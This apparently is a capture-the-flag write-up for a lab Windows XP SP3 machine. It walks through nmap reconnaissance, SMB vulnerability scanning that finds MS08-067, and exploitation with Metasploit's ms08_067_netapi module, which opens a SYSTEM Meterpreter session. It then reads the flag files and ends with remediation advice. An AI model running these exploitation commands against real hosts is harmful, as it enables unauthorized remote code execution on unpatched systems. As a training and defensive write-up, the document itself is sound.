## Reconnaissance

### Nmap Scan

Run a default script and version detection scan, saving output for later reference.

```bash
nmap -sC -sV -oN initial.txt 10.129.221.131
```

```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds

OS: Windows XP SP3
```

**Key observations:**
- Port `445/tcp` (SMB) is open
- OS fingerprinted as **Windows XP SP3**
- No authentication services (RDP, SSH) exposed — SMB is the primary attack surface

---

## Vulnerability Scanning

Run Nmap's built-in SMB vulnerability scripts against port 445.

```bash
nmap --script=smb-vuln* 10.129.221.131
```

```
smb-vuln-ms08-067: VULNERABLE
CVE-2008-4250
```

The host is confirmed vulnerable to **MS08-067**. This vulnerability exists in the `NetpwPathCanonicalize()` function of `netapi32.dll` and allows a remote, unauthenticated attacker to execute arbitrary code with SYSTEM privileges.

---

## Exploitation

### Using Metasploit

Search for the module by CVE and load it.

```bash
msfconsole
search cve:2008-4250
use exploit/windows/smb/ms08_067_netapi
show options
```

Configure the required options and run the exploit.

```bash
set RHOSTS 10.129.221.131
set LHOST 10.10.14.45
set LPORT 4445
run
```

A Meterpreter session opens with **NT AUTHORITY\SYSTEM** — no privilege escalation needed.

---

## Flag Retrieval

```bash
# User flag
type "C:\Documents and Settings\john\Desktop\user.txt"

# Root flag
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

---

## Summary

| Step | Tool / Command |
|------|---------------|
| Port scan | `nmap -sC -sV` |
| Vuln detection | `nmap --script=smb-vuln*` |
| Exploit | Metasploit `ms08_067_netapi` |
| Result | SYSTEM shell — no privesc required |

### Key Takeaways

- **MS08-067** is a pre-authentication RCE that grants immediate SYSTEM access with no credentials needed
- Windows XP and Server 2003 without the KB958644 patch remain vulnerable
- The attack path mirrors real-world intrusions against unpatched legacy systems still found in industrial and embedded environments

### Remediation

- Apply Microsoft patch **KB958644**
- Disable SMBv1 if legacy protocol support is not required
- Isolate legacy systems behind strict firewall rules, blocking inbound access to ports 139 and 445
